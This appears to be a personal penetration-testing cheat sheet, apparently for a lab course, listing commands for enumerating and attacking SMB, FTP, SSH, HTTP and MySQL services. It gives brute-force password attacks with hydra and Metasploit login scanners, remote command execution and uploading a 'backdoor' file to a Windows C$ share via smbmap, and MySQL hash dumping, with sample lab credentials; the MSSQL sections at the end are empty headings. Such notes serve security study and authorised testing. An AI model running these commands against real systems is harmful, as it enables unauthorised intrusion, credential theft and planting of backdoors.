
 Servers and services

- **SMB**

- SMB - discover and mount

-  SMB nmap scripts

Nmap -p445 --script smb-protocols [IP]  //scan for what protocol is using

Nmap -p445 --script smb-security-mode [IP] //scan for the security mode

Nmap -p445 --script smb-enum-sessions [IP] //scan to see who is logged in

Nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 [IP] //scan for sessions using administrator user and password(if you know them)

Nmap -p445 --script smb-enum-shares [IP] // scan for what is shared from each user

Nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=aministrator-771 [IP] //scan for sharessting the directories shared(knowing the administrator password)

Nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=aministrator-771 [IP]  //scan for existing users(knowing the administrator password)

Nmap -p445 --script smb-enum-domains --script-args

smbusername=administrator,smbpassword=aministrator-771 [IP] //scan for domains(knowing the administrator password)

Nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=aministrator_771 [IP] //scan for groups(knowing the administrator password)

Nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=aministrator

-771 [IP] //scan for services running(knowing the administrator password)

- SMB smbmap

Nmap -p445 --script smb-protocols [IP] //scan for smb protocols used

Smbmap -u guest -p "" -d . -H [IP] // connect with null session and see what is shared and permissions

Smbmap -u administrator -p [password] -d . -H [IP] // connect with administrator user and see what is shared and permissions

Smbmap -H [IP] -u administrator -p [password] -x 'ipconfig' //running ipconfig using user and password

Smbmap -H [IP] -u administrator -p [password] -L //check for shared drives

Smbmap -H [IP] -u administrator -p [password] -r 'C$' //connect to the C drive

Smbmap -H [IP] -u administrator -p [password] --upload '[source path]' '[target path(eg 'C$\backdoor')]' //upload file to the C drive

Smbmap -H [IP] -u administrator -p [password] --download '[Source path]' //download a file from source to root

- SMB: Samba

Nmap [IP] -sU --top-port 25 --open //scan for top 25 UDP ports and displays only the ones that are open

Nmap [IP] -p445 --script smb-os-discovery // Operating system discovery of the port 445

Msfconsole //metasploit framework

Use auxiliary/scanner/smb/smb_version // configure and run , checks for the version

Nmblookup -A [

Smbclient -L [ip] -N // checks for information using null session

Rpcclient -U "" -N [ip] //connect using a null session

Srvinfo //check server info in the rpcclient session

Enum4linux -o [ip] //get operating system information

Smbclient -L [ip] -N //checks information with null session

Nmap [ip] -p445 --script smb-protocols // checks for SMB protocol used

Msfconsole:

Use auxiliary/scanner/smb/smb2 // configure and run to find about smb version

Enum4linux -U [ip] // list of users

Msfconsole:

Use auxiliary/scanner/smb/smb_enumshares // configure and run, returns shares

Enum4linux -S [ip] //returns shares

Smbclient -L [ip] -N //returns shares

Enum4linux -G [ip] // return groups

Rcpclient -U "" -N [ip] ->enumdomgroups //returns groups

Enum4linux  -i [ip]  //returns printers shared

Smbclient //[ip]/public -N //connect with null session

- SMB dictionary attack

Msfconsole:

Use auxiliary/scanner/smb/smb_login //configure(rhosts, pass_file, smbuser) and run. Tries to crack the pass for the user configured from a list of common passwords

Gzip -d  [path] //decompress a zip file

Hydra -l  [username] -P [path to file] [ip] smb //Tries to crack the pass for the user configured from a list of common passwords

Smbmap -H [ip] -u [username] -p [password] //connects to a user that was cracked

Smbclient //[ip]/[user] -U [user] //connects to the user's shared dir/files

Msfconsole:

Use auxiliary/scanner/smb/pipe_auditor //configure(smbuser, smbpass, rhost) run. Gives back a list of pipes

Enum4linux -r -u "[user]" -p "[password]" [ip] //returns SIDs of the users

- **FTP**

Hydra -L [path to user file] -P [path to pass file] [ip] ftp //tries to crack the passwords for all the users in the list

Ftp [ip] ->user->pass //connects to ftp if you have user and pass

Nmap [ip] --script ftp-brute --script-args userdb=[path to users file] -p21

- ftp anonymous login

Nmap [ip] -p21 --script ftp-anon //checks if anonymous login is allowed on the ftp

Ftp [ip]->user=anonymous->pass=enter //anonymous connect to the ftps that allow anonymous connect

- SSH

- ssh basics

Ssh root@[ip] //connects to the root of the ssh server if you have password

Nc [ip] [port] //gives back the  of the server

Nmap [ip] -p 22 --script ssh2-enum-algos //returns all the algorithms

Nmap [ip] -p 22 --script ssh-hostkey --script-args ssh_hostkey=full //returns the full ssh-rsa key

Nmap [ip] -p 22 --script ssh-auth-methods --script-args="ssh.user=[username]" //returns the authentication method for the specific user

Ssh [user]@[ip] // connects if the authentication method is none_auth

- ssh dictionary attack

Hydra -l [user] -P [path to pass file] [ip] ssh // cracks the password for user from a common passwords list

Nmap [ip] -p 22 --script ssh-brute --script-args userdb=[path to users file] //brute forces the password for the users in the file

Msfconsole:

Use auxiliary/scanner/ssh/ssh_login //configure(rhosts, userpass_file,stop_on_success to true, verbose to true) run. Tries to crack the users in the db based on the pass file and stops once he cracked the first one because of stop on success

- HTTP

- http IIS

Whatweb [ip] //information about server

Http [ip] //informations about server

Dirb [http://[ip](http://[ip)] //scans for directories that might be exposed. You can check them 1 by 1 in browser

Browsh  --startup-url [http://[ip]/](http://[ip]/) //loads the content of the website in the terminal

- http IIS nmap scripts

Nmap [ip] -sV -p 80 --script http-enum //enumerates potential interesting folders

Nmap [ip] -sV -p 80 --script http-headers //checks header

Nmap [ip] -sV -p 80 --script http-methods --script-args http-methods.url-path=/webdav/   //enumerates the supported methods

Nmap [ip] -sV -p 80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/   //identifies webdav instalations

- http Apache

Nmap [ip] -sV -p 80 -script banner //return the banner

Msfconsole:

Use auxiliary/scanner/http/http_version //configure rhosts and run. Returns server info

Curl [ip] | more //returns header information(more is to display 1 page at the time

Wget "[http://[ip]/index](http://[ip]/index)"" //retrieves web files. In this case the index file will be downloaded. Use cat to see it

Browsh --startup-url [ip] //info about the site

Lynx [http://[ip](http://[ip)] //same info as above

Msfconsole:

Use auxiliary/scanner/http/brute_dirs  //set rhosts and run. Brute forces to find directories

Dirb [http://[ip](http://[ip)] [path to directory names file]  //scans to find directories

Msfconsole:

Use auxiliary/scanner/http/robots_txt  //configure and run. This can be abused to reveal interesting information about areas of the site which an admin may not want to be public knowledge.

Curl [http://[ip]/cgi-bin/](http://[ip]/cgi-bin/) |more   //cgi-bin to be replaced with what was found in the previous scan

- SQL

- MySQL basics

mysql -h 192.214.149.3 -u root

show databases;

use books;

select * from authors;

msfconsole

use auxiliary/scanner/mysql/mysql_writable_dirs  // configure and run. Returns writable dirs on victim

use auxiliary/scanner/mysql/mysql_hashdump  // returns hashes

- MySQL dictionary attack

- MSSQL nmap scripts

- MSSQL Metasploit

-